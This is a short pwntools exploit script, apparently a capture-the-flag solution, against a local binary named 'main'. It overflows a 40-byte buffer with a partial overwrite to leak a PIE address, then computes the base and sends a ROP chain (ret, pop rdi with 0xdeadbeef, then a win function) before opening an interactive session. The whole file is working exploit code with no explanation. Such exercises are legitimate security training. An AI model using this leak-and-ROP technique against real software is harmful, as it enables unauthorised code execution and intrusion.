from pwn import  *

#p = remote("192.168.100.226",9091)
p = process('./main')

payload = b'A'*40 + b'\xa5'

p.send(payload)

p.recvline()
pie_leak=p.recvline()

leak_bytes = pie_leak[40:-1]
leak_addr = u64(leak_bytes.ljust(8, b'\x00'))
print(hex(leak_addr))

base=leak_addr - 0x00000000000012a5

win=base + 0x1129
ret = base + 0x00000000000012b5
pop_rdi =base +  0x00000000000011ce
payload2 = b'A'*40 +p64(ret)+ p64(pop_rdi)+p64(0xdeadbeef)+p64(win)
p.send(payload2)

p.interactive()
